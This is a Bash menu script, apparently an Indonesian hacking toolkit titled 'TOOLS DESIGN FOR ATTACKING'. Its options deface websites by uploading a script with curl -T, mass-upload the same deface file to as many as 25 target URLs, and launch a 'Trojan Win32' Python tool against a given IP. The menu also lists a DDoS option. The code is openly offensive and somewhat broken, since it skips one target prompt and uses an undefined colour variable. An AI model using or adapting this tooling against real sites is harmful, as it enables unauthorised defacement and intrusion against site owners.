blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
dark='\033[90;1m'
clear
echo $indigo
date
echo $dark"================================================="
echo $red"             CIREBON PROGRAMMER COMUNITY"
echo $dark"================================================="
echo $purple"          TOOLS DESIGN FOR ATTACKING"
echo $cyan"                Author : Suhandi"
echo $green"         Suport By : MR.Ghost Include"
echo $dark"================================================="
echo $purple"MENU :" $yellow"                                     v2.3"
echo $green"||" $red"Depes" $green"     ||" $dark"Deface"
echo $green"||" $red"Explo" $green"     ||" $dark"Exploit"
echo $green"||" $red"Trojan" $green"    ||" $dark"Distributed Danial Of Service"
echo $green"||" $red"Close" $green"     ||" $dark"Exit Program"
echo
echo $blue"MASUKAN PILIHAN ANDA"
echo $red""
read -p "[Pilih]==>" apaan

if [ $apaan = "Depes" ] || [ $apaan = "depes" ]
then
clear
toilet -f standard Deface
neofetch
echo $red"TARUH SCRIPT DEFACE ANDA DILUAR FOLDER!"
echo
echo $cyan"Masukan Web Target"
echo $blue" "
read -p "[Web]==>" target
echo
echo $cyan"Masukan Script"
echo $blue""
read -p "[script]==>" script
curl -T /storage/emulated/0/$script $target
echo
echo $green"Hasil Deface :"
echo
echo $dark"$target/$script"
echo
echo $blue"Press Enter To Main Menu"
read -p "" enter
sh AZZAB.sh
fi

if [ $apaan = "Explo" ] || [ $apaan = "explo" ]
then
clear
toilet -f standard Exploit
neofetch
echo
echo $red"TARUH SCRIPT KAMU DI LUAR FOLDER"
echo
echo $cyan"Masukan Script"
echo $blue""
read -p "[Masuk]==>" script
echo
echo $cyan"Masukan Web Target 1"
echo $blue""
read -p "[Masuk]==>" target1
echo
echo $cyan"Masukan Web Target 2"
echo $blue""
read -p "[Masuk]==>" target2
echo
echo $cyan"Masukan Web Target 3"
echo $blue""
read -p "[Masuk]==>" target3
echo
echo $cyan"Masukan Web Target 4"
echo $blue""
read -p "[Masuk]==>" target4
echo
echo $cyan"Masukan Web Target 5"
echo $blue""
read -p "[Masuk]==>" target5
echo
echo $cyan"Masukan Web Target 6"
echo $blue""
read -p "[Masuk]==>" target6
echo
echo $cyan"Masukan Web Target 7"
echo $blue""
read -p "[Masuk]==>" target7
echo
echo $cyan"Masukan Web Target 8"
echo $blue""
read -p "[Masuk]==>" target8
echo
echo $cyan"Masukan Web Target 9"
echo $blue""
read -p "[Masuk]==>" target9
echo
echo $cyan"Masukan Web Target 10"
echo $blue""
read -p "[Masuk]==>" target10
echo
echo $cyan"Masukan Web Target 11"
echo $blue""
read -p "[Masuk]==>" target11
echo
echo $cyan"Masukan Web Target 12"
echo $blue""
read -p "[Masuk]==>" target12
echo
echo $cyan"Masukan Web Target 13"
echo $blue""
read -p "[Masuk]==>" target13
echo
echo $cyan"Masukan Web Target 14"
echo $blue""
read -p "[Masuk]==>" target14
echo
echo $cyan"Masukan Web Target 15"
echo $blue""
read -p "[Masuk]==>" target15
echo
echo $cyan"Masukan Web Target 16"
echo $blue""
read -p "[Masuk]==>" target16
echo
echo $cyan"Masukan Web Target 17"
echo $blue""
read -p "[Masuk]==>" target17
echo
echo $cyan"Masukan Web Target 18"
echo $blue""
read -p "[Masuk]==>" target18
echo
echo $cyan"Masukan Web Target 19"
echo $blue""
read -p "[Masuk]==>" target19
echo
echo $cyan"Masukan Web Target 20"
echo $blue""
read -p "[Masuk]==>" target20
echo
echo $cyan"Masukan Web Target 21"
echo $blue""
read -p "[Masuk]==>" target21
echo
echo $cyan"Masukan Web Target 22"
echo $blue""
read -p "[Masuk]==>" target22
echo
echo $cyan"Masukan Web Target 23"
echo $blue""
read -p "[Masuk]==>" target24
echo
echo $cyan"Masukan Web Target 25"
echo $blue""
read -p "[Masuk]==>" target25
echo
echo
echo $green"Press Enter To Proccesing Expxlo"
read -p "" enter
clear
toilet -f standard Proccesing
echo
echo
curl -T /storage/emulated/0/$script $target1
curl -T /storage/emulated/0/$script $target2
curl -T /storage/emulated/0/$script $target3
curl -T /storage/emulated/0/$script $target4
curl -T /storage/emulated/0/$script $target5
curl -T /storage/emulated/0/$script $target6
curl -T /storage/emulated/0/$script $target7
curl -T /storage/emulated/0/$script $target8
curl -T /storage/emulated/0/$script $target9
curl -T /storage/emulated/0/$script $target10
curl -T /storage/emulated/0/$script $target11
curl -T /storage/emulated/0/$script $target12
curl -T /storage/emulated/0/$script $target13
curl -T /storage/emulated/0/$script $target14
curl -T /storage/emulated/0/$script $target15
curl -T /storage/emulated/0/$script $target16
curl -T /storage/emulated/0/$script $target17
curl -T /storage/emulated/0/$script $target18
curl -T /storage/emulated/0/$script $target19
curl -T /storage/emulated/0/$script $target20
curl -T /storage/emulated/0/$script $target21
curl -T /storage/emulated/0/$script $target22
curl -T /storage/emulated/0/$script $target23
curl -T /storage/emulated/0/$script $target24
curl -T /storage/emulated/0/$script $target25
echo
echo $cyan"SELESAI !"
echo $green"Press Enter To Watch Hasil"
read -p "" enter
clear
echo $cyan""
toilet -f standard Hasil
echo
echo $blue"Hasil Eksekusi : "
echo $dark"
$target1/$script
$target2/$script
$target3/$script
$target4/$script
$target5/$script
$target6/$script
$target7/$script
$target8/$script
$target9/$script
$target10/$script
$target11/$script
$target12/$script
$target13/$script
$target14/$script
$target15/$script
$target16/$script
$target17/$script
$target18/$script
$target19/$script
$target20/$script
$target21/$script
$target22/$script
$target23/$script
$target24/$script
$target25/$script"
echo
echo $indigo
date
echo $purple"Press Enter To Main Menu"
read -p "" enter
sh AZZAB.sh
fi

if [ $apaan = "Trojan" ] || [ $apaan = "trojan" ]
then
toilet -f standard Trojan Win32
neofetch
echo
echo $cyan"Masukan IP target"
echo $blue""
read -p "[Masuk]==>" ip
clear
python3 win32.py -s $ip -p 80 -t 135
fi

if [ $apaan = "Close" ] || [ $apaan = "close" ]
then
clear
toilet -f standard Thankyou
echo
echo $dark"Exit Program"
exit
fi
